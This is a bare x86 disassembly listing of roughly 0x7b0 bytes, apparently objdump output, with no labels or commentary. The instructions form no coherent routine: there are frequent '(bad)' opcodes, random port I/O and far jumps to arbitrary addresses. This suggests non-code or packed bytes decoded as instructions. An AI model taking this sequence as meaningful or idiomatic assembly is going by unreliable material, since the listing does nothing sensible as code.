  42ae3c:	test   DWORD PTR [ebx],eax
  42ae3e:	in     eax,0xe8
  42ae40:	ret    0x24da
  42ae43:	and    ah,BYTE PTR [ebx]
  42ae45:	imul   edi,esp,0x829d8c3b
  42ae4b:	iret   
  42ae4c:	mov    dh,0x9c
  42ae4e:	imul   edx,DWORD PTR [ebx],0xffffffb0
  42ae51:	xor    BYTE PTR [ebx+0xe9fe1c9],bl
  42ae57:	jne    0x42aeab
  42ae59:	push   edi
  42ae5a:	mov    bl,0x14
  42ae5c:	adc    bh,BYTE PTR es:0xeae126cd
  42ae63:	inc    ebx
  42ae64:	xchg   ebx,eax
  42ae65:	mov    ch,0xb3
  42ae67:	ror    BYTE PTR [edx+0x62d18e9d],cl
  42ae6d:	jmp    0x42ae51
  42ae6f:	aaa    
  42ae70:	push   ds
  42ae71:	jmp    0xcb21671c
  42ae76:	xor    DWORD PTR [esi+eiz*1+0x55],0xd20cd448
  42ae7e:	ret    0xc3aa
  42ae81:	push   eax
  42ae82:	mov    ebx,0x11375fe8
  42ae87:	inc    BYTE PTR [eax-0x1f]
  42ae8a:	mov    ah,0x84
  42ae8c:	out    dx,eax
  42ae8d:	test   BYTE PTR [edx-0x25d57a68],ch
  42ae93:	out    0x95,al
  42ae95:	jle    0x42aeb2
  42ae97:	(bad)  
  42ae98:	sbb    al,0x69
  42ae9a:	pushf  
  42ae9b:	stc    
  42ae9c:	test   DWORD PTR [esi-0x6e],0xa331892e
  42aea3:	jb     0x42af0a
  42aea5:	aam    0xb2
  42aea7:	out    dx,eax
  42aea8:	mov    bh,BYTE PTR [esi-0x36e1ce3f]
  42aeae:	cld    
  42aeaf:	inc    ebx
  42aeb0:	out    dx,eax
  42aeb1:	pop    eax
  42aeb2:	adc    ecx,DWORD PTR [ebp-0x3b]
  42aeb5:	add    al,0xba
  42aeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aeb8:	or     eax,0xb05b9d07
  42aebd:	mov    al,ds:0x1614041b
  42aec2:	ret    0x1dce
  42aec5:	inc    ebp
  42aec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aec7:	mul    BYTE PTR [ecx]
  42aec9:	mov    dh,0xd
  42aecb:	xchg   ebx,eax
  42aecc:	jne    0x42aef0
  42aece:	(bad)  
  42aecf:	cmc    
  42aed0:	out    dx,al
  42aed1:	jg     0x42af27
  42aed3:	jp     0x42ae7a
  42aed5:	in     al,0x25
  42aed7:	sahf   
  42aed8:	loope  0x42af36
  42aeda:	push   esi
  42aedb:	adc    esp,DWORD PTR [ebp-0x5a0fad45]
  42aee1:	adc    al,0x83
  42aee3:	jbe    0x42aeca
  42aee5:	mov    esi,0xafaae875
  42aeea:	sbb    al,0x5e
  42aeec:	bswap  ebx
  42aeee:	push   ss
  42aeef:	inc    ecx
  42aef0:	push   ds
  42aef1:	in     eax,0x6d
  42aef3:	pop    edi
  42aef4:	daa    
  42aef5:	dec    ecx
  42aef6:	loopne 0x42aead
  42aef8:	or     BYTE PTR [edx+ebx*8+0x2f],dl
  42aefc:	adc    eax,0xceea718b
  42af01:	adc    al,0xa5
  42af03:	mov    esi,0x74b1299e
  42af08:	push   esp
  42af09:	stos   BYTE PTR es:[edi],al
  42af0a:	call   0xa56c35c6
  42af0f:	leave  
  42af10:	sbb    BYTE PTR [ebp+0x4c],dl
  42af13:	adc    eax,0xce1f4077
  42af18:	retf   0xbadf
  42af1b:	je     0x42af85
  42af1d:	das    
  42af1e:	arpl   WORD PTR [ecx+0x14],ax
  42af21:	xchg   ecx,eax
  42af22:	adc    ecx,DWORD PTR [eax]
  42af24:	jne    0x42af8a
  42af26:	sti    
  42af27:	jmp    0xa91d:0xba10871e
  42af2e:	and    ebp,DWORD PTR [esi]
  42af30:	(bad)  
  42af31:	lods   al,BYTE PTR ds:[esi]
  42af32:	daa    
  42af33:	jb     0x42aec1
  42af35:	jo     0x42af46
  42af37:	xchg   DWORD PTR [edx],esp
  42af39:	mov    ecx,0xda4b2180
  42af3e:	and    DWORD PTR [edx+esi*1+0x69],edx
  42af42:	dec    edx
  42af43:	(bad)  
  42af45:	xchg   ecx,eax
  42af46:	pop    esp
  42af47:	shl    DWORD PTR [ebx+0x25cfbd28],cl
  42af4d:	dec    edi
  42af4e:	in     eax,dx
  42af4f:	out    dx,al
  42af50:	adc    dh,bh
  42af52:	fmul   QWORD PTR [esi-0xa8836d0]
  42af58:	ror    BYTE PTR [esi-0x695ab4e4],0x0
  42af5f:	outs   dx,BYTE PTR ds:[esi]
  42af60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af61:	push   edi
  42af62:	icebp  
  42af63:	cld    
  42af64:	mov    ds:0xb34e4704,eax
  42af69:	pop    ebp
  42af6a:	or     esi,DWORD PTR [ebx+ebx*1]
  42af6d:	jmp    0xd6f72b7b
  42af72:	in     eax,0x6a
  42af74:	push   ss
  42af75:	test   al,0xeb
  42af77:	test   ch,bl
  42af79:	mov    edx,0xe15e5cef
  42af7e:	dec    ecx
  42af7f:	test   BYTE PTR [eax],al
  42af81:	(bad)  
  42af82:	mov    cl,0xc4
  42af84:	or     dh,BYTE PTR [ecx]
  42af86:	xor    dh,BYTE PTR [ebx-0x1f]
  42af89:	add    DWORD PTR [ebx+edx*8+0x140b4174],ebp
  42af90:	nop
  42af91:	sub    eax,0x5375f4b6
  42af96:	cs ret 0xf585
  42af9a:	cmp    esi,ebp
  42af9c:	add    ah,BYTE PTR [ecx]
  42af9e:	sbb    BYTE PTR [ecx+0x47],cl
  42afa1:	mov    ecx,0x11dc57a
  42afa6:	cs aad 0x60
  42afa9:	xchg   esp,eax
  42afaa:	push   edx
  42afab:	addr16 add eax,0x20f5ab79
  42afb1:	fbstp  TBYTE PTR [ebx-0x1601bc79]
  42afb7:	ins    DWORD PTR es:[edi],dx
  42afb8:	and    ebp,DWORD PTR [ecx]
  42afba:	cmp    al,0xfc
  42afbc:	xchg   esi,eax
  42afbd:	mov    bh,0xe7
  42afbf:	pop    edx
  42afc0:	scas   eax,DWORD PTR es:[edi]
  42afc1:	pusha  
  42afc2:	rcr    BYTE PTR [esi+0x5d195cf4],0x7e
  42afc9:	push   edx
  42afca:	in     al,dx
  42afcb:	repz dec esp
  42afcd:	adc    ch,dh
  42afcf:	rol    DWORD PTR [ecx],cl
  42afd1:	lds    esi,FWORD PTR [esi+0x4a891d9c]
  42afd7:	xchg   DWORD PTR [edx],esi
  42afd9:	sub    al,0x60
  42afdb:	xor    al,0x91
  42afdd:	ins    BYTE PTR es:[edi],dx
  42afde:	pop    ss
  42afdf:	cwde   
  42afe0:	iret   
  42afe1:	fwait
  42afe2:	repz in al,dx
  42afe4:	sub    BYTE PTR [ecx-0x12cdd5b4],cl
  42afea:	mov    eax,0x7f1582c4
  42afef:	mov    ecx,0x15d75ef6
  42aff4:	sub    esi,DWORD PTR [esi+0x7b]
  42aff7:	outs   dx,DWORD PTR ds:[esi]
  42aff8:	pushf  
  42aff9:	jno    0x42b060
  42affb:	mov    esi,0x2e7c3061
  42b000:	push   ebx
  42b001:	out    dx,eax
  42b002:	mov    dl,0x54
  42b004:	pop    ss
  42b005:	xchg   esp,eax
  42b006:	adc    cl,bh
  42b008:	enter  0xeaa,0x32
  42b00c:	push   esi
  42b00d:	add    esp,0x1e
  42b010:	cdq    
  42b011:	inc    esp
  42b012:	mov    ebp,0xe86b0a27
  42b017:	ds cmp bl,ch
  42b01a:	retf   
  42b01b:	out    dx,eax
  42b01c:	pushf  
  42b01d:	fwait
  42b01e:	out    0x72,eax
  42b020:	imul   edi,edi,0xffffffad
  42b023:	jmp    0xf90e5742
  42b028:	repnz cmp BYTE PTR [di],dl
  42b02c:	sbb    al,0x79
  42b02e:	lea    ecx,[eax]
  42b030:	mov    ch,0x48
  42b032:	adc    BYTE PTR [esi-0x5be95979],0x95
  42b039:	xchg   ebp,eax
  42b03a:	clc    
  42b03b:	icebp  
  42b03c:	imul   ebp,DWORD PTR [ebp-0x3e],0xe
  42b040:	xchg   edx,eax
  42b041:	pop    ecx
  42b042:	xchg   BYTE PTR [edi-0x33],cl
  42b045:	cmp    ebx,DWORD PTR [ecx+0xe651baa]
  42b04b:	popa   
  42b04c:	push   ds
  42b04d:	and    edx,ebp
  42b04f:	xchg   ebx,eax
  42b050:	add    eax,0xc1ebc808
  42b055:	fsub   DWORD PTR ds:0xb959ce55
  42b05b:	push   es
  42b05c:	adc    al,0xa0
  42b05e:	mov    ds:0xf4250f07,eax
  42b063:	mov    DWORD PTR ds:0xd4edc1ee,eax
  42b069:	push   edx
  42b06a:	pop    ecx
  42b06b:	call   FWORD PTR ds:0xf8271869
  42b071:	call   0x810b:0xd290dfed
  42b078:	or     DWORD PTR [ebp-0x3b614458],0xffffffc7
  42b07f:	xlat   BYTE PTR ds:[ebx]
  42b080:	sbb    al,0x9
  42b082:	je     0x42b083
  42b084:	std    
  42b085:	mov    eax,0x1e8adf24
  42b08a:	or     ecx,DWORD PTR [ebx]
  42b08c:	mul    dh
  42b08e:	std    
  42b08f:	iret   
  42b090:	sbb    ch,bl
  42b092:	mov    ss,WORD PTR [edx+0x1018fff0]
  42b098:	pop    ds
  42b099:	lahf   
  42b09a:	mov    esp,0x3d948914
  42b09f:	repnz xchg ebp,eax
  42b0a1:	icebp  
  42b0a2:	pop    edx
  42b0a3:	out    0xef,eax
  42b0a5:	into   
  42b0a6:	icebp  
  42b0a7:	jnp    0x42b0b7
  42b0a9:	jmp    0x42b0cb
  42b0ab:	dec    edi
  42b0ac:	sbb    esi,ebp
  42b0ae:	jle    0x42b03a
  42b0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0b1:	mov    dl,0xce
  42b0b3:	jbe    0x42b0da
  42b0b5:	cli    
  42b0b6:	and    dh,cl
  42b0b8:	sahf   
  42b0b9:	mov    ebp,0x91735fb
  42b0be:	lahf   
  42b0bf:	sar    BYTE PTR [eax],1
  42b0c1:	scas   eax,DWORD PTR es:[edi]
  42b0c2:	sbb    eax,0xbba0b540
  42b0c7:	dec    edx
  42b0c8:	repnz cmp DWORD PTR [eax+0x12],ebx
  42b0cc:	sahf   
  42b0cd:	popf   
  42b0ce:	mov    esp,0xb9492033
  42b0d3:	pop    ds
  42b0d4:	jmp    0xbb9e:0xde7fbad7
  42b0db:	inc    edx
  42b0dc:	fdivr  QWORD PTR [ebp+0x6280f012]
  42b0e2:	mov    ds:0x9bbcf429,al
  42b0e7:	push   esi
  42b0e8:	int3   
  42b0e9:	mov    ch,0xb5
  42b0eb:	xchg   esp,eax
  42b0ec:	pop    ebp
  42b0ed:	xlat   BYTE PTR ds:[ebx]
  42b0ee:	sub    eax,DWORD PTR [ebx+ecx*8+0x1fda2128]
  42b0f5:	push   ss
  42b0f6:	ret    
  42b0f7:	adc    cl,BYTE PTR [ecx+0x7791da9]
  42b0fd:	ret    
  42b0fe:	add    dh,BYTE PTR [esi-0x24]
  42b101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b102:	mov    ah,0xfd
  42b104:	outs   dx,DWORD PTR gs:[esi]
  42b106:	inc    esi
  42b107:	repnz and ebp,ebp
  42b10a:	xor    cl,BYTE PTR [ecx]
  42b10c:	fwait
  42b10d:	in     eax,dx
  42b10e:	rcr    BYTE PTR [edx-0x2082c86a],0x1e
  42b115:	inc    ecx
  42b116:	pop    ss
  42b117:	add    edx,DWORD PTR [edi-0x3a]
  42b11a:	add    ebx,DWORD PTR [edi-0xe6ba52b]
  42b120:	xchg   ebp,eax
  42b121:	adc    al,0x2e
  42b123:	test   al,0x24
  42b125:	sub    DWORD PTR [ebp-0x49],esi
  42b128:	jbe    0x42b0f5
  42b12a:	sahf   
  42b12b:	inc    edi
  42b12c:	sub    DWORD PTR [eax+0x5ebf450b],0x9871a1eb
  42b136:	mov    ebp,0x9a58f912
  42b13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b13c:	mov    eax,DWORD PTR [ebp-0x7fdc2864]
  42b142:	nop
  42b143:	pop    esi
  42b144:	push   ebp
  42b145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b146:	fild   DWORD PTR [ebp-0x33]
  42b149:	out    0xc0,al
  42b14b:	je     0x42b130
  42b14d:	fild   DWORD PTR [ecx]
  42b14f:	mov    ecx,0x1679205a
  42b154:	xchg   DWORD PTR [esi],esi
  42b156:	mov    esp,0xaba2e8cc
  42b15b:	mov    BYTE PTR [edi+0xe267bbe],ah
  42b161:	rcl    dh,1
  42b163:	(bad)  
  42b166:	retf   0x46b4
  42b169:	mov    ch,0x19
  42b16b:	dec    ebx
  42b16c:	push   es
  42b16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b16e:	jnp    0x42b124
  42b170:	repnz mov ebx,0x65fad688
  42b176:	mov    bl,0x70
  42b178:	push   esp
  42b179:	les    esi,FWORD PTR [esp-0x33d5860b]
  42b180:	aad    0x97
  42b182:	dec    esi
  42b183:	std    
  42b184:	adc    al,0x4b
  42b186:	ficom  WORD PTR [esi]
  42b188:	fs addr16 push eax
  42b18b:	out    dx,al
  42b18c:	loope  0x42b1f3
  42b18e:	mov    ch,0x44
  42b190:	adc    al,0x37
  42b192:	mov    al,ds:0xede10544
  42b197:	icebp  
  42b198:	sub    eax,0x8a737bcb
  42b19d:	pop    ecx
  42b19e:	aam    0xa7
  42b1a0:	ficomp WORD PTR [esi+0x1c]
  42b1a3:	add    al,dl
  42b1a5:	icebp  
  42b1a6:	mov    edx,0xb6c4d528
  42b1ab:	jmp    0x1ad32a2c
  42b1b0:	sbb    DWORD PTR [ecx-0x70],edi
  42b1b3:	add    BYTE PTR [esi],0x4c
  42b1b6:	jp     0x42b1f5
  42b1b8:	lods   eax,DWORD PTR ds:[esi]
  42b1b9:	mov    al,ds:0xecb1d1b
  42b1be:	pop    ecx
  42b1bf:	push   edi
  42b1c0:	lds    esi,FWORD PTR [esi]
  42b1c2:	(bad)  
  42b1c3:	xor    DWORD PTR es:[edx-0x44],edx
  42b1c7:	push   esp
  42b1c8:	dec    esp
  42b1c9:	addr16 cmp esp,0xefc144b5
  42b1d0:	and    DWORD PTR [ecx-0x5b],edx
  42b1d3:	mov    eax,es:0x77732f8a
  42b1d9:	push   ds
  42b1da:	jl     0x42b25b
  42b1dc:	in     eax,0x54
  42b1de:	ret    
  42b1df:	in     al,dx
  42b1e0:	icebp  
  42b1e1:	fcmovu st,st(0)
  42b1e3:	add    BYTE PTR [edi],bl
  42b1e5:	pop    ecx
  42b1e6:	pop    ebx
  42b1e7:	iret   
  42b1e8:	sub    eax,0xa83cb46b
  42b1ed:	push   ds
  42b1ee:	call   0x9de5:0xb61985ef
  42b1f5:	sti    
  42b1f6:	not    BYTE PTR [ebx+eiz*1-0x79222617]
  42b1fd:	dec    esi
  42b1fe:	xchg   esi,eax
  42b1ff:	mov    al,ds:0xb25bb3b3
  42b204:	xlat   BYTE PTR ds:[ebx]
  42b205:	ds out 0xec,eax
  42b208:	xchg   ebp,eax
  42b209:	sbb    DWORD PTR [edx+0x6e198259],ecx
  42b20f:	jnp    0x42b1a0
  42b211:	jg     0x42b24e
  42b213:	fld    TBYTE PTR [ebp-0x64]
  42b216:	mov    ebx,0xfa8930aa
  42b21b:	out    0x99,eax
  42b21d:	mov    ds:0xe94dc407,al
  42b222:	enter  0xec1b,0xf8
  42b226:	(bad)  
  42b227:	sub    al,0xa4
  42b229:	xchg   BYTE PTR [edi],dh
  42b22b:	lock push ebp
  42b22d:	push   0xd4d5f2d8
  42b232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b233:	popa   
  42b234:	and    cl,BYTE PTR [ecx+0x53]
  42b237:	in     al,dx
  42b238:	or     DWORD PTR [ecx-0x25],eax
  42b23b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b23c:	inc    esi
  42b23d:	jnp    0x42b229
  42b23f:	pop    es
  42b240:	gs push es
  42b242:	test   bh,ah
  42b244:	addr16 adc al,0x78
  42b247:	and    ah,BYTE PTR [ebx]
  42b249:	sub    DWORD PTR [esi],ebp
  42b24b:	push   ds
  42b24c:	test   eax,0x36ac930d
  42b251:	and    al,0xcd
  42b253:	fisub  DWORD PTR [eax+0x45fef008]
  42b259:	retf   0x7ffa
  42b25c:	and    cl,BYTE PTR [ecx]
  42b25e:	test   BYTE PTR [eax],bh
  42b260:	(bad)  
  42b261:	sub    DWORD PTR [edx],edi
  42b263:	or     dl,BYTE PTR [ebp+0x11f00524]
  42b269:	pop    edx
  42b26a:	fwait
  42b26b:	in     al,dx
  42b26c:	push   esi
  42b26d:	sbb    esi,DWORD PTR [ebx+0x54393685]
  42b273:	and    BYTE PTR [ecx],cl
  42b275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b276:	stc    
  42b277:	mov    edx,0xfddba268
  42b27c:	sar    DWORD PTR [esi+0x4a8c3983],cl
  42b282:	js     0x42b250
  42b284:	and    edi,DWORD PTR [ecx]
  42b286:	xor    edx,DWORD PTR [ecx+eiz*8]
  42b289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b28a:	pop    esp
  42b28b:	or     bh,bh
  42b28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b28e:	imul   ecx,edi,0xffffffbf
  42b291:	add    al,0xe5
  42b293:	cmp    edi,DWORD PTR [eax-0x70]
  42b296:	adc    al,0xdf
  42b298:	sbb    DWORD PTR [esi-0x4],eax
  42b29b:	je     0x42b2ca
  42b29d:	cmc    
  42b29e:	push   0xb4c81d40
  42b2a3:	jbe    0x42b28e
  42b2a5:	or     al,0xd9
  42b2a7:	mov    eax,0xad90c772
  42b2ac:	jo     0x42b2df
  42b2ae:	mov    ecx,0x23b92436
  42b2b3:	mov    dh,BYTE PTR [esi]
  42b2b5:	jns    0x42b2a4
  42b2b7:	ret    
  42b2b8:	gs into 
  42b2ba:	pop    ebx
  42b2bb:	push   esp
  42b2bc:	iret   
  42b2bd:	(bad)  
  42b2be:	mov    ch,0x71
  42b2c0:	and    eax,0x9a0d7df6
  42b2c5:	in     al,dx
  42b2c6:	inc    ebx
  42b2c7:	fnstcw WORD PTR [esi]
  42b2c9:	inc    esp
  42b2ca:	and    dl,BYTE PTR [ebp+0x16]
  42b2cd:	pop    ecx
  42b2ce:	in     al,dx
  42b2cf:	pushf  
  42b2d0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42b2d2:	sbb    ecx,DWORD PTR [ebp+0x382fd3a0]
  42b2d8:	cdq    
  42b2d9:	mov    edx,0x5d9b37cf
  42b2de:	mov    esi,0xc80dfbe4
  42b2e3:	std    
  42b2e4:	and    eax,0xa8f68dc3
  42b2e9:	jmp    0x8cea:0xed25638d
  42b2f0:	and    al,0x89
  42b2f2:	mov    eax,0x3359b575
  42b2f7:	(bad)  [esi-0x62]
  42b2fa:	sbb    esp,DWORD PTR [edx+0x5b5fb594]
  42b300:	bound  edx,QWORD PTR [ecx]
  42b302:	cmp    DWORD PTR [ecx],eax
  42b304:	jnp    0x42b364
  42b306:	mov    bh,0x54
  42b308:	stos   DWORD PTR es:[edi],eax
  42b309:	ffreep st(0)
  42b30b:	shl    DWORD PTR [ebp-0x4c0a75f2],1
  42b311:	adc    BYTE PTR [edx+0x75],dh
  42b314:	mov    ds:0x89e5e510,eax
  42b319:	xchg   BYTE PTR [ebp-0x39a1d82c],bh
  42b31f:	test   DWORD PTR [ebp-0x3d],0x9ab8f1b6
  42b326:	sbb    eax,0x86af1dbd
  42b32b:	sbb    cl,cl
  42b32d:	repnz cmp ebx,DWORD PTR [eax+ebx*4+0x5f]
  42b332:	xor    ch,BYTE PTR [ebp-0x15404f6b]
  42b338:	rol    al,1
  42b33a:	push   0xb9eb15c7
  42b33f:	add    al,0x8f
  42b341:	mov    al,ds:0x9e543889
  42b346:	cmp    edx,esp
  42b348:	ds xchg ebp,eax
  42b34a:	jae    0x42b3af
  42b34c:	ret    0x8917
  42b34f:	add    al,0x23
  42b351:	leave  
  42b352:	add    bh,BYTE PTR [esp+ebx*4]
  42b355:	sub    DWORD PTR [ecx+0x9],0x4c
  42b359:	call   0x1e86:0xbed5847b
  42b360:	mov    esi,0x1ee360ba
  42b365:	mov    ecx,0x2129ec3c
  42b36a:	fmulp  st(4),st
  42b36c:	fsub   DWORD PTR [ecx+0x2b1fa10b]
  42b372:	inc    esi
  42b373:	jge    0x42b3dc
  42b375:	out    dx,eax
  42b376:	cmp    BYTE PTR [ebx+0x23],bl
  42b379:	jns    0x42b350
  42b37b:	adc    edi,DWORD PTR [esi]
  42b37d:	test   BYTE PTR [edx+0x5c112018],ch
  42b383:	out    0xf7,eax
  42b385:	sub    eax,edx
  42b387:	mov    eax,ds:0xf4229a0b
  42b38c:	ds dec ecx
  42b38e:	es fmul st(6),st
  42b391:	xchg   BYTE PTR [edi-0x1f4c2e40],bh
  42b397:	call   0xe8077861
  42b39c:	mov    esi,0xc8884e2b
  42b3a1:	xor    dl,bl
  42b3a3:	out    dx,eax
  42b3a4:	(bad)  
  42b3a5:	mov    ebp,cs
  42b3a7:	and    al,0xdb
  42b3a9:	das    
  42b3aa:	cmp    DWORD PTR [ebx],ecx
  42b3ac:	retf   
  42b3ad:	xchg   esi,eax
  42b3ae:	jl     0x42b361
  42b3b0:	lds    ebx,FWORD PTR [edi-0x74a29733]
  42b3b6:	mov    dl,0x38
  42b3b8:	push   ds
  42b3b9:	cdq    
  42b3ba:	pop    ds
  42b3bb:	sbb    dl,0x82
  42b3be:	sbb    eax,0xede21418
  42b3c3:	jnp    0x42b3c0
  42b3c5:	adc    eax,0x9c8927b4
  42b3ca:	pop    ds
  42b3cb:	add    al,0x5f
  42b3cd:	cmp    BYTE PTR fs:[ebx],0xb1
  42b3d1:	js     0x42b38f
  42b3d3:	les    esi,FWORD PTR [eax-0x5a3baefb]
  42b3d9:	das    
  42b3da:	mov    bl,0xf3
  42b3dc:	mov    esi,0x1d0ec0f7
  42b3e1:	pop    ecx
  42b3e2:	stc    
  42b3e3:	scas   eax,DWORD PTR es:[edi]
  42b3e4:	xchg   esp,eax
  42b3e5:	inc    edx
  42b3e6:	mov    ebp,0x7b9de33e
  42b3eb:	es xor BYTE PTR gs:[edx],cl
  42b3ef:	sub    ebx,eax
  42b3f1:	pop    esp
  42b3f2:	dec    esi
  42b3f3:	sbb    al,0xe0
  42b3f5:	je     0x42b3b6
  42b3f7:	add    al,0x51
  42b3f9:	push   esp
  42b3fa:	mov    cl,0x9a
  42b3fc:	data16 stos BYTE PTR es:[edi],al
  42b3fe:	push   esi
  42b3ff:	add    BYTE PTR [edi],bl
  42b401:	jp     0x42b3fe
  42b403:	mov    es:0x39690a61,al
  42b409:	dec    esi
  42b40a:	sti    
  42b40b:	inc    esp
  42b40c:	sbb    DWORD PTR ds:0xa1933257,edx
  42b412:	cmp    edx,DWORD PTR [edi-0x569525c]
  42b418:	mov    ch,0x65
  42b41a:	mov    esi,0xb5407665
  42b41f:	je     0x42b470
  42b421:	xchg   ebp,eax
  42b422:	ret    0xb95d
  42b425:	sbb    eax,0xbf2ba8f3
  42b42a:	mov    bl,0xec
  42b42c:	aad    0x4
  42b42e:	stc    
  42b42f:	fld    st(2)
  42b431:	jmp    0x42b3e7
  42b433:	hlt    
  42b434:	push   0xb5b6e2a0
  42b439:	in     eax,0xeb
  42b43b:	repnz add cl,BYTE PTR [ebx+0x32182ec5]
  42b442:	jb     0x42b4c1
  42b444:	sbb    al,0x7a
  42b446:	ret    
  42b447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b448:	cmp    ebx,DWORD PTR [ecx]
  42b44a:	lods   eax,DWORD PTR ds:[esi]
  42b44b:	mov    dl,0x71
  42b44d:	sbb    DWORD PTR [ebx-0x645f1afd],esi
  42b453:	dec    ebx
  42b454:	cmovle esi,esp
  42b457:	mov    ebx,0xe82cadfa
  42b45c:	push   esp
  42b45d:	clc    
  42b45e:	mov    cl,0x4
  42b460:	cmp    esp,DWORD PTR [eax-0x7fdbf833]
  42b466:	cli    
  42b467:	mov    ds:0x5a6fedb6,eax
  42b46c:	sbb    BYTE PTR [di+0x27],ch
  42b470:	ror    BYTE PTR [edi-0x6da0bd9],0x25
  42b477:	mov    eax,ds:0xbb1ea54a
  42b47c:	mov    ebp,0xeb526b99
  42b481:	aas    
  42b482:	push   es
  42b483:	inc    ebx
  42b484:	scas   eax,DWORD PTR es:[edi]
  42b485:	push   esi
  42b486:	add    eax,0xb6d2c1c1
  42b48b:	test   cl,bh
  42b48d:	adc    DWORD PTR [ecx+ecx*4-0x12b5102b],0x31
  42b495:	and    eax,DWORD PTR [ecx+0x60]
  42b498:	pop    ss
  42b499:	mov    DWORD PTR [ecx+0x575975f5],esp
  42b49f:	mov    dx,0x3b9e
  42b4a3:	and    ch,BYTE PTR [ebp+0x4f73b130]
  42b4a9:	sub    DWORD PTR [esi],0x2fac8c45
  42b4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4b0:	sbb    DWORD PTR [esi-0x3959e4c6],ebp
  42b4b6:	sbb    al,0x1
  42b4b8:	loopne 0x42b45c
  42b4ba:	(bad)  [ebx+0x70]
  42b4bd:	push   ecx
  42b4be:	pop    ecx
  42b4bf:	or     bl,BYTE PTR ds:0x5a775529
  42b4c5:	add    al,0x9c
  42b4c7:	gs jns 0x42b462
  42b4ca:	jge    0x42b478
  42b4cc:	lea    ebx,[ebx+esi*1+0x650ae833]
  42b4d3:	mov    esi,0x9ee8931
  42b4d8:	lods   al,BYTE PTR ds:[esi]
  42b4d9:	call   0x9a99:0xd0205a36
  42b4e0:	jne    0x42b51c
  42b4e2:	cmp    esp,ebp
  42b4e4:	pop    esp
  42b4e5:	mov    cl,0xaa
  42b4e7:	lods   eax,DWORD PTR ds:[esi]
  42b4e8:	sub    bl,ah
  42b4ea:	pop    ds
  42b4eb:	jge    0x42b561
  42b4ed:	or     cl,cl
  42b4ef:	mov    BYTE PTR [ecx],bl
  42b4f1:	int3   
  42b4f2:	dec    edi
  42b4f3:	and    edx,DWORD PTR ds:0x40e9fe1d
  42b4f9:	daa    
  42b4fa:	dec    ecx
  42b4fb:	das    
  42b4fc:	push   ss
  42b4fd:	mov    DWORD PTR [edx+0x1d],eax
  42b500:	(bad)  
  42b502:	aas    
  42b503:	sahf   
  42b504:	icebp  
  42b505:	aad    0xb
  42b507:	mov    ds:0x214fb282,eax
  42b50c:	call   0x7bba:0x13b690f4
  42b513:	rol    DWORD PTR [edx-0x5c],0x79
  42b517:	fs pop ss
  42b519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b51a:	adc    BYTE PTR [edi],dh
  42b51c:	xchg   ebp,eax
  42b51d:	out    0xfb,al
  42b51f:	jmp    0x11e6c204
  42b524:	push   ss
  42b525:	cmp    DWORD PTR [edi],ebx
  42b527:	jmp    0xb9b0:0x46c75fee
  42b52e:	sbb    esi,DWORD PTR ds:0xd1e3d753
  42b534:	sbb    al,0xe5
  42b536:	js     0x42b53d
  42b538:	fnstsw WORD PTR [esi-0x3da90fee]
  42b53e:	fstp   DWORD PTR [edi+0x23]
  42b541:	std    
  42b542:	das    
  42b543:	mov    ecx,0x796bcf00
  42b548:	mov    ecx,0x220fbc2b
  42b54d:	mov    BYTE PTR [edx+0x3a091d6c],ch
  42b553:	lods   eax,DWORD PTR ds:[esi]
  42b554:	pop    ebp
  42b555:	lds    edx,FWORD PTR [esi+ebp*2-0x12]
  42b559:	mov    eax,ds:0x380c51ab
  42b55e:	rcl    BYTE PTR [eax-0x75914ef5],0xeb
  42b565:	call   0xbc5b:0x5642ea7b
  42b56c:	jb     0x42b516
  42b56e:	or     edx,DWORD PTR [esi-0x34]
  42b571:	jl     0x42b4fe
  42b573:	xchg   ebp,eax
  42b574:	xor    eax,0x5cbd160c
  42b579:	adc    al,0xce
  42b57b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b57c:	inc    ecx
  42b57d:	xchg   ebp,eax
  42b57e:	cmp    al,0x1a
  42b580:	sbb    edx,DWORD PTR ds:0x992586cb
  42b586:	inc    ecx
  42b587:	call   0x23891859
  42b58c:	jns    0x42b517
  42b58e:	xor    BYTE PTR [edi+ebx*8],dl
  42b591:	pop    ss
  42b592:	lock aaa 
  42b594:	push   ebp
  42b595:	cs fsubrp st(7),st
  42b598:	jo     0x42b5d2
  42b59a:	test   al,bl
  42b59c:	xor    al,0x29
  42b59e:	retf   0xb92b
  42b5a1:	mov    ?,WORD PTR [ecx+0x0]
  42b5a4:	jno    0x42b5fe
  42b5a6:	xor    BYTE PTR [ebx-0x1c04576c],bl
  42b5ac:	int3   
  42b5ad:	add    dh,BYTE PTR [ebx-0x33c59fc8]
  42b5b3:	loopne 0x42b5fe
  42b5b5:	stc    
  42b5b6:	mov    al,0x84
  42b5b8:	in     al,dx
  42b5b9:	pop    esi
  42b5ba:	adc    eax,0x7e44b7f9
  42b5bf:	int    0x1
  42b5c1:	iret   
  42b5c2:	push   0xd316f3ef
  42b5c7:	stos   DWORD PTR es:[edi],eax
  42b5c8:	push   esi
  42b5c9:	fs mov cl,0x34
  42b5cc:	fiadd  DWORD PTR [edi-0x61e98a54]
  42b5d2:	les    esi,FWORD PTR [ecx]
  42b5d4:	sti    
  42b5d5:	lahf   
  42b5d6:	pop    ss
  42b5d7:	and    bl,BYTE PTR [ebp+0x6c]
  42b5da:	adc    BYTE PTR [edx-0x1e],0xda
  42b5de:	and    DWORD PTR [esi-0x33],0xfab8b93d
  42b5e5:	pop    es
  42b5e6:	std    
  42b5e7:	sbb    BYTE PTR [esi+0x2109c95],bh
  42b5ed:	adc    edx,ebp
